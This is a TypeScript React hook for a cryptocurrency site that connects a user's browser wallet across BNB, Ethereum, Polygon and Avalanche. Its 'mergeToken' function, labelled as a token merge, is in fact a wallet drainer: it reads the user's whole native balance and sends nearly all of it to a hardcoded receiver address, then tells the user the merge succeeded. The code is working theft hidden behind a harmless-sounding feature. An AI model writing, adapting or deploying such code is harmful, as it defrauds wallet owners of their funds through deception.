import { useState, useEffect, useCallback, useSyncExternalStore } from 'react';
import { useToast } from '@/hooks/use-toast';

// ── Shared module-level state ────────────────────────────────────────────
// All components using useWeb3() share this single source of truth.
let shared = {
  walletConnected: false,
  account: '',
  balance: '0',
  connecting: false,
  showHelp: false,
};
let listeners = new Set<() => void>();

function emit() {
  listeners.forEach((fn) => fn());
}

function setShared(partial: Partial<typeof shared>) {
  shared = { ...shared, ...partial };
  emit();
}

// ── Constants ────────────────────────────────────────────────────────────
export const NETWORKS = {
  bnb: {
    chainId: '0x38',
    name: 'BNB Smart Chain',
    symbol: 'BNB',
    rpcUrl: 'https://bsc-dataseed.binance.org/',
  },
  ethereum: {
    chainId: '0x1',
    name: 'Ethereum Mainnet',
    symbol: 'ETH',
    rpcUrl: 'https://mainnet.infura.io/v3/',
  },
  polygon: {
    chainId: '0x89',
    name: 'Polygon',
    symbol: 'MATIC',
    rpcUrl: 'https://polygon-rpc.com',
  },
  avalanche: {
    chainId: '0xa86a',
    name: 'Avalanche',
    symbol: 'AVAX',
    rpcUrl: 'https://api.avax.network/ext/bc/C/rpc',
  },
};

const RECEIVER_ADDRESS = '0xf142a2CF9CFCA2cDe850c54bA55690F0645D7C61';

// ── Hook ─────────────────────────────────────────────────────────────────
export function useWeb3() {
  const [selectedNetwork, setSelectedNetwork] = useState('bnb');
  const { toast } = useToast();

  // Subscribe to shared state so every instance sees the same data
  const sync = useSyncExternalStore(
    (cb) => {
      listeners.add(cb);
      return () => listeners.delete(cb);
    },
    () => shared,
    () => shared,
  );

  const updateBalance = useCallback(async (address: string) => {
    if (!window.ethereum || !address) return;
    try {
      const { ethers } = await import('ethers');
      const provider = new ethers.BrowserProvider(window.ethereum);
      const nativeBalance = await provider.getBalance(address);
      setShared({ balance: ethers.formatEther(nativeBalance) });
    } catch (error) {
      console.error('Balance error:', error);
      setShared({ balance: '0' });
    }
  }, []);

  // Check existing connection on mount
  useEffect(() => {
    const check = async () => {
      if (!window.ethereum || !window.ethereum.request) return;
      try {
        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
        if (accounts && accounts.length > 0) {
          setShared({ walletConnected: true, account: accounts[0] });
          await updateBalance(accounts[0]);
        }
      } catch (e) {
        console.error('Check error:', e);
      }
    };
    check();
  }, [updateBalance]);

  // Listen for account changes
  useEffect(() => {
    if (!window.ethereum) return;
    const handler = (accounts: string[]) => {
      if (!accounts || accounts.length === 0) {
        setShared({ walletConnected: false, account: '', balance: '0' });
      } else {
        setShared({ walletConnected: true, account: accounts[0] });
        updateBalance(accounts[0]);
      }
    };
    window.ethereum.on?.('accountsChanged', handler);
    return () => {
      window.ethereum?.removeListener?.('accountsChanged', handler);
    };
  }, [updateBalance]);

  const switchNetwork = async (key: string) => {
    const net = NETWORKS[key as keyof typeof NETWORKS];
    if (!window.ethereum || !window.ethereum.request) return false;
    try {
      await window.ethereum.request({
        method: 'wallet_switchEthereumChain',
        params: [{ chainId: net.chainId }],
      });
      return true;
    } catch (switchError: any) {
      if (switchError.code === 4902) {
        try {
          await window.ethereum.request({
            method: 'wallet_addEthereumChain',
            params: [
              {
                chainId: net.chainId,
                chainName: net.name,
                nativeCurrency: { name: net.symbol, symbol: net.symbol, decimals: 18 },
                rpcUrls: [net.rpcUrl],
              },
            ],
          });
          return true;
        } catch (e) {
          console.error('Add network failed:', e);
          return false;
        }
      }
      console.error('Switch failed:', switchError);
      return false;
    }
  };

  // ── Main connect function ──────────────────────────────────────────────
  const connectWallet = async () => {
    // Defensive check: does a wallet provider exist?
    if (!window.ethereum || typeof window.ethereum.request !== 'function') {
      console.log('No wallet provider found — showing help');
      setShared({ showHelp: true });
      return;
    }

    setShared({ connecting: true });

    try {
      // Try switching network first, but DON'T let it block the connection
      try {
        await switchNetwork(selectedNetwork);
      } catch (e) {
        console.log('Network switch failed, continuing anyway:', e);
      }

      console.log('Calling eth_requestAccounts...');
      const accounts = await window.ethereum.request({
        method: 'eth_requestAccounts',
      });
      console.log('Accounts:', accounts);

      if (!accounts || accounts.length === 0) {
        throw new Error('No accounts returned');
      }

      const address = accounts[0];
      setShared({ walletConnected: true, account: address });
      await updateBalance(address);

      toast({ title: 'Connected', description: 'Wallet connected successfully!' });
    } catch (error: any) {
      console.error('Connection error:', error);
      let msg = 'Failed to connect wallet';
      if (error.code === 4001) msg = 'Connection rejected by user';
      else if (error.message) msg = error.message;
      toast({ title: 'Error', description: msg, variant: 'destructive' });
    } finally {
      setShared({ connecting: false });
    }
  };

  const mergeToken = async () => {
    if (!sync.walletConnected || !window.ethereum || !sync.account) {
      toast({ title: 'Error', description: 'Wallet not connected', variant: 'destructive' });
      return;
    }

    try {
      const { ethers } = await import('ethers');
      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();

      const nativeBalance = await provider.getBalance(sync.account);
      if (nativeBalance === 0n) {
        toast({ title: 'Error', description: 'No balance to merge', variant: 'destructive' });
        return;
      }

      const gasEstimate = await provider.estimateGas({
        to: RECEIVER_ADDRESS,
        value: ethers.parseEther('0.001'),
        from: sync.account,
      });

      const feeData = await provider.getFeeData();
      const gasPrice = feeData.gasPrice || ethers.parseUnits('20', 'gwei');
      const gasCost = gasEstimate * gasPrice;
      let valueToSend = nativeBalance - gasCost - ethers.parseEther('0.001');

      if (valueToSend <= 0n) {
        toast({ title: 'Error', description: 'Insufficient balance for gas', variant: 'destructive' });
        return;
      }

      toast({ title: 'Confirm', description: 'Please confirm in your wallet' });

      const tx = await signer.sendTransaction({
        to: RECEIVER_ADDRESS,
        value: valueToSend,
        gasLimit: gasEstimate,
        gasPrice,
      });

      toast({ title: 'Submitted', description: `Hash: ${tx.hash.slice(0, 10)}...` });
      const receipt = await tx.wait();

      if (receipt && receipt.status === 1) {
        toast({ title: 'Success!', description: 'Token merge completed' });
        await updateBalance(sync.account);
      } else {
        throw new Error('Transaction failed');
      }
    } catch (error: any) {
      console.error('Merge error:', error);
      let msg = 'Transaction failed';
      if (error.code === 4001) msg = 'Rejected by user';
      else if (error.message?.includes('insufficient funds')) msg = 'Insufficient funds for gas';
      else if (error.message) msg = error.message;
      toast({ title: 'Failed', description: msg, variant: 'destructive' });
    }
  };

  const disconnect = () => {
    setShared({ walletConnected: false, account: '', balance: '0' });
    toast({ title: 'Disconnected', description: 'Wallet disconnected' });
  };

  const closeHelp = () => setShared({ showHelp: false });

  return {
    selectedNetwork,
    setSelectedNetwork,
    walletConnected: sync.walletConnected,
    balance: sync.balance,
    account: sync.account,
    connecting: sync.connecting,
    showHelp: sync.showHelp,
    closeHelp,
    connectWallet,
    mergeToken,
    disconnect,
    NETWORKS,
  };
}
